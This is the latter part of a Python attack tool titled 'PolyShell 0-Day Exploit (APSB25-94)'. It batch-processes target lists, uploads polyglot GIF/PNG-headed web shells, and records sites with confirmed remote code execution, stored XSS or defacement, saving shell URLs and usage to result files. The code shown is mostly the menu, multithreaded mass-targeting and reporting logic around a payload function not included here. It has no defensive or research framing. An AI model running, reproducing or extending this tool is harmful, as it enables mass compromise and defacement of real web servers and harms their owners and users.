                safe_print(f"\n{G}[!!!] RCE + HTML CONFIRMED - {len(both_shells)} SHELL(S){RST}")
                for s in both_shells:
                    safe_print(f"\n{G}[+]{RST} File: {s['filename']}")
                    safe_print(f"{G}[+]{RST} URL: {s['url']}")
                    safe_print(f"{G}[+]{RST} RCE Usage: {s['usage']}")
                    safe_print(f"{G}[+]{RST} HTML: Open in browser for XSS!")
            
            if rce_shells and not both_shells:
                safe_print(f"\n{G}[!!!] RCE CONFIRMED - {len(rce_shells)} SHELL(S){RST}")
                for s in rce_shells:
                    safe_print(f"\n{G}[+]{RST} File: {s['filename']}")
                    safe_print(f"{G}[+]{RST} URL: {s['url']}")
                    safe_print(f"{G}[+]{RST} Usage: {s['usage']}")
            
            if html_shells and not both_shells:
                safe_print(f"\n{G}[!!!] HTML RENDERING - {len(html_shells)} FILE(S){RST}")
                for s in html_shells:
                    safe_print(f"\n{G}[+]{RST} File: {s['filename']}")
                    safe_print(f"{G}[+]{RST} URL: {s['url']}")
                    safe_print(f"{G}[+]{RST} Open in browser for defacement page!")
            
            if accessible:
                safe_print(f"\n{Y}[+] ACCESSIBLE - {len(accessible)} FILE(S){RST}")
                for s in accessible[:5]:  # Show first 5
                    safe_print(f"{Y}[+]{RST} {s['filename']}: {s['url']}")
                if len(accessible) > 5:
                    safe_print(f"{Y}[+]{RST} ... and {len(accessible)-5} more")
        
        safe_print(f"\n{'='*70}")
        
        return results
        
    except Exception as e:
        safe_print(f"{R}[ERROR]{RST} {str(e)}")
        return None

# ==================== BATCH PROCESSING ====================
def process_targets(targets, mode, header_type, filename, use_random=False):
    """Process multiple targets"""
    ensure_output_dir()
    
    # RCE.txt for RCE/both modes, polyshell_results.txt ONLY for XSS mode
    if mode == 'rce':
        rce_file = os.path.join(OUTPUT_DIR, "RCE.txt")
        result_file = None
    elif mode == 'xss':
        rce_file = None
        result_file = os.path.join(OUTPUT_DIR, "polyshell_results.txt")
    else:  # both
        rce_file = os.path.join(OUTPUT_DIR, "RCE.txt")
        result_file = os.path.join(OUTPUT_DIR, "polyshell_results.txt")
    
    rce_count = 0
    html_count = 0
    upload_count = 0
    failed_count = 0
    
    total_rce_files = 0
    total_html_files = 0
    total_upload_files = 0
    
    start_time = datetime.now()
    
    # Initialize polyshell_results.txt only for XSS/both modes
    if result_file:
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(f"PolyShell 0-Day Results - {timestamp}\n")
            f.write(f"Mode: {mode.upper()}\n")
            f.write(f"Header: {header_type.upper()}\n")
            f.write(f"Filename: {filename}\n")
            f.write(f"Targets: {len(targets)}\n")
            f.write("="*70 + "\n\n")
    
    for idx, target in enumerate(targets, 1):
        safe_print(f"\n{C}[{idx}/{len(targets)}]{RST} Testing: {target}")
        
        # Generate random filename for each target if random mode
        target_filename = filename
        if use_random:
            import random
            import string
            target_filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
            safe_print(f"{C}[*]{RST} Random filename: {target_filename}")
        
        results = deploy_polyshell(target, mode, header_type, target_filename, rce_file, start_time)
        
        if results:
            rce_shells = [r for r in results if r['status'] == 'RCE']
            html_shells = [r for r in results if r['status'] == 'HTML_RENDERS']
            
            # Save all RCE shells for this target together
            if rce_shells and rce_file:
                save_rce_result(target, rce_shells, rce_file, start_time)
                rce_count += 1
                total_rce_files += len(rce_shells)
                if result_file:
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write(f"Target: {target}\n")
                        f.write(f"Status: RCE CONFIRMED!\n")
                        f.write(f"Severity: CRITICAL\n\n")
                        for s in rce_shells:
                            f.write(f"  Filename: {s['filename']}\n")
                            f.write(f"  URL: {s['url']}\n")
                            f.write(f"  Header: {s['header']}\n")
                            f.write(f"  Extension: {s['extension']}\n")
                            f.write(f"  Usage: {s['usage']}\n\n")
                        f.write("-"*70 + "\n\n")
            
            elif html_shells:
                html_count += 1
                total_html_files += len(html_shells)
                if result_file:
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write(f"Target: {target}\n")
                        f.write(f"Status: HTML RENDERING!\n")
                        f.write(f"Severity: HIGH (Stored XSS / Defacement)\n\n")
                        for s in html_shells:
                            f.write(f"  Filename: {s['filename']}\n")
                            f.write(f"  URL: {s['url']}\n")
                            f.write(f"  Open in browser!\n\n")
                        f.write("-"*70 + "\n\n")
            
            else:
                upload_count += 1
                if results:
                    total_upload_files += len(results)
                if result_file:
                    with open(result_file, 'a', encoding='utf-8') as f:
                        f.write(f"Target: {target}\n")
                        f.write(f"Status: File Upload Confirmed\n")
                        f.write(f"Files: {len(results)}\n\n")
                    f.write("-"*70 + "\n\n")
        else:
            failed_count += 1
    
    # Final summary
    safe_print(f"\n{'='*70}")
    safe_print(f"{C}FINAL SUMMARY{RST}")
    safe_print(f"{'='*70}")
    safe_print(f"{G}[RCE]{RST} RCE Confirmed: {rce_count} target(s) | {total_rce_files} file(s)")
    safe_print(f"{G}[HTML]{RST} HTML Rendering: {html_count} target(s) | {total_html_files} file(s)")
    safe_print(f"{Y}[UPLOAD]{RST} File Upload: {upload_count} target(s) | {total_upload_files} file(s)")
    safe_print(f"{R}[FAILED]{RST} Failed: {failed_count} target(s)")
    
    if rce_file and mode in ['rce', 'both']:
        safe_print(f"\n{G}[+]{RST} RCE results saved to: {rce_file}")
    if result_file and mode in ['xss', 'both']:
        safe_print(f"{G}[+]{RST} XSS/HTML results saved to: {result_file}")
    
    safe_print(f"{'='*70}\n")

# ==================== MENU ====================
def show_main_menu():
    """Display main menu"""
    print(f"\n{G}[1]{RST} Execute RCE")
    print(f"{G}[2]{RST} Execute HTML / XSS")
    print(f"{G}[3]{RST} Execute BOTH RCE & HTML XSS")
    print(f"{R}[0]{RST} Exit\n")

def show_header_menu():
    """Display header selection menu"""
    print(f"\n{G}[1]{RST} GIF HEADER")
    print(f"{G}[2]{RST} PNG HEADER")
    print(f"{G}[3]{RST} ALL IMAGE HEADERS\n")

# ==================== MAIN ====================
def main():
    """Main function"""
    global THREADS
    
    # Parse CLI arguments
    parser = argparse.ArgumentParser(description='PolyShell 0-Day Exploit (APSB25-94)', add_help=False)
    parser.add_argument('-t', '--target', help='Target list file path')
    parser.add_argument('-f', '--filename', default='bobwashere', help='Shell filename')
    parser.add_argument('-m', '--mode', choices=['rce', 'xss', 'both'], help='Mode')
    parser.add_argument('-ht', '--header', choices=['gif', 'png', 'all'], help='Header type')
    parser.add_argument('-th', '--threads', type=int, default=THREADS, help=f'Threads (default: {THREADS})')
    parser.add_argument('-r', '--random-filename', action='store_true', help='Use random filename (8 chars) per upload')
    parser.add_argument('-h', '--help', action='store_true', help='Show help')
    
    args = parser.parse_args()
    
    print(BANNER)
    
    # Show help
    if args.help:
        parser.print_help()
        return
    
    # CLI mode if all required args provided
    if args.target and args.mode and args.header:
        if not os.path.exists(args.target):
            safe_print(f"{R}[!]{RST} File not found: {args.target}\n")
            return
        
        with open(args.target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        # Set filename based on random flag
        filename = args.filename
        use_random = args.random_filename
        
        safe_print(f"\n{Y}[CONFIGURATION]{RST}")
        safe_print(f"  Mode: {args.mode.upper()}")
        safe_print(f"  Header: {args.header.upper()}")
        safe_print(f"  Filename: {'RANDOM (8 chars)' if use_random else filename}")
        safe_print(f"  Targets: {len(targets)}")
        safe_print(f"  Threads: {args.threads}")
        
        THREADS = args.threads
        
        safe_print(f"\n{Y}[*]{RST} Starting PolyShell attack...\n")
        process_targets(targets, args.mode, args.header, filename, use_random)
        return
    
    # Interactive mode
    while True:
        show_main_menu()
        
        choice = input(f"{C}[?]{RST} Select option: ").strip()
        
        if choice == '0':
            safe_print(f"\n{Y}[*]{RST} Exiting...\n")
            break
        
        if choice not in ['1', '2', '3']:
            safe_print(f"{R}[!]{RST} Invalid option\n")
            continue
        
        # Map choice to mode
        mode_map = {'1': 'rce', '2': 'xss', '3': 'both'}
        mode = mode_map[choice]
        
        # Get header type
        show_header_menu()
        header_choice = input(f"{C}[?]{RST} Select header type: ").strip()
        
        if header_choice not in ['1', '2', '3']:
            safe_print(f"{R}[!]{RST} Invalid option\n")
            continue
        
        header_map = {'1': 'gif', '2': 'png', '3': 'all'}
        header_type = header_map[header_choice]
        
        # Ask for random or fixed filename
        print(f"\n{Y}[FILENAME MODE]{RST}")
        print(f"{G}[1]{RST} Fixed filename (same name for all uploads)")
        print(f"{G}[2]{RST} Random filename (unique name per upload)\n")
        
        filename_mode = input(f"{C}[?]{RST} Select filename mode (1/2): ").strip()
        
        if filename_mode not in ['1', '2']:
            safe_print(f"{R}[!]{RST} Invalid option\n")
            continue
        
        # Get filename based on mode
        if filename_mode == '1':
            # Fixed filename
            default_filename = 'bobwashere'
            filename_input = input(f"{C}[?]{RST} Enter filename (default: {default_filename}): ").strip()
            filename = filename_input if filename_input else default_filename
            use_random = False
        else:
            # Random filename
            filename = 'RANDOM'
            use_random = True
            safe_print(f"{G}[+]{RST} Random filename mode enabled (8 chars per upload)")
        
        # Validate filename
        invalid_chars = ['/', '?', '*', ':', '"', ';', '<', '>', '(', ')', '|', '{', '}', '\\']
        if any(char in filename for char in invalid_chars):
            safe_print(f"{R}[!]{RST} Invalid filename - contains forbidden characters\n")
            continue
        
        # Get target file
        target_file = input(f"{C}[?]{RST} Target list file path: ").strip()
        
        if not os.path.exists(target_file):
            safe_print(f"{R}[!]{RST} File not found: {target_file}\n")
            continue
        
        # Read targets
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        safe_print(f"{G}[+]{RST} Loaded {len(targets)} target(s)")
        
        # Get threads
        threads = THREADS
        thread_input = input(f"{C}[?]{RST} Threads (default {THREADS}): ").strip()
        if thread_input:
            try:
                threads = int(thread_input)
            except:
                safe_print(f"{R}[!]{RST} Invalid thread count, using {THREADS}")
                threads = THREADS
        
        # Confirm
        safe_print(f"\n{Y}[CONFIGURATION]{RST}")
        safe_print(f"  Mode: {mode.upper()}")
        safe_print(f"  Header: {header_type.upper()}")
        safe_print(f"  Filename: {'RANDOM (8 chars)' if use_random else filename}")
        safe_print(f"  Targets: {len(targets)}")
        safe_print(f"  Threads: {threads}")
        
        confirm = input(f"\n{C}[?]{RST} Start attack? (y/N): ").strip().lower()
        
        if confirm == 'y':
            # Update global THREADS for use in deploy_polyshell
            THREADS = threads
            safe_print(f"\n{Y}[*]{RST} Starting PolyShell attack...\n")
            process_targets(targets, mode, header_type, filename, use_random)
        else:
            safe_print(f"{Y}[*]{RST} Cancelled\n")

if __name__ == "__main__":
    main()
